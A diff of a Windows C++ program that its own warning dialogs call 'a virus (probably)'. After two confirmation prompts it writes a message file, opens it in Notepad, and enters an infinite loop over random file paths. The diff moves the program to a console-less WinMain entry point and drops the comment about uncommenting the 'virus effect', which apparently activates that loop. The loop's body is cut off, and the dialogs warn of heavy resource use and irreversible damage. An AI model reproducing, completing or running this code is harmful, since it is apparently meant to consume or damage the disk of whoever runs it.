@@ -6,7 +6,7 @@
 #include<string>
 #include<vector>
 #include<io.h>
-#include<iostream>
+//#include<iostream>
 using namespace std;
 void ReleaseImage(LPCTSTR path) {
 	if (auto rsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_IMG1), _T("img"))) {
@@ -64,8 +64,8 @@ string GetRandomPath() {
 	return path;
 }
 
-int main(){
-//int WINAPI _tWinMain(HINSTANCE, HINSTANCE, LPTSTR, INT) {
+//int main(){
+int WINAPI _tWinMain(HINSTANCE, HINSTANCE, LPTSTR, INT) {
 	srand(unsigned(time(nullptr)));
 	if (MessageBox(NULL, _T("这是一个病毒（大概\r\n你确定要继续运行它吗？"), _T("警告"), MB_YESNO|MB_ICONERROR) == 6) {
 		if (MessageBox(NULL, _T("最后警告：\r\n该程序可能会占用大量资源，并可能造成不可逆的后果，确定继续？"), _T("警告"), MB_YESNO|MB_ICONERROR) == 6) {
@@ -75,12 +75,20 @@ int main(){
 				const WCHAR str[] = L"保管好你的电脑。";
 				const BYTE unicodeHead[] = { 0xFF, 0xFE }; //unicode文件头文件
 				WriteFile(hfile, unicodeHead, sizeof(unicodeHead), &dwWritten, NULL);
-				WriteFile(hfile, str, sizeof str, &dwWritten, NULL);
+				WriteFile(hfile, str, sizeof str-sizeof WCHAR, &dwWritten, NULL);
 				CloseHandle(hfile);
 
-				system("notepad.exe C:\\tmp.txt");
+				STARTUPINFO info;
+				PROCESS_INFORMATION information;
+				TCHAR command[233];
+				ZeroMemory(&info, sizeof info);
+				ZeroMemory(&information, sizeof information);
+				ZeroMemory(command, sizeof command);
+				_tcscat_s(command,sizeof command, _T("notepad.exe C:\\tmp.txt"));
+				CreateProcess(NULL, command, NULL, NULL, false, 0, NULL, NULL, &info, &information);
+				CloseHandle(information.hProcess);
+				CloseHandle(information.hThread);
 
-				//打开以下注释以获得病毒效果
 				string backup;
 				while (1) {
 					string ws = GetRandomPath();
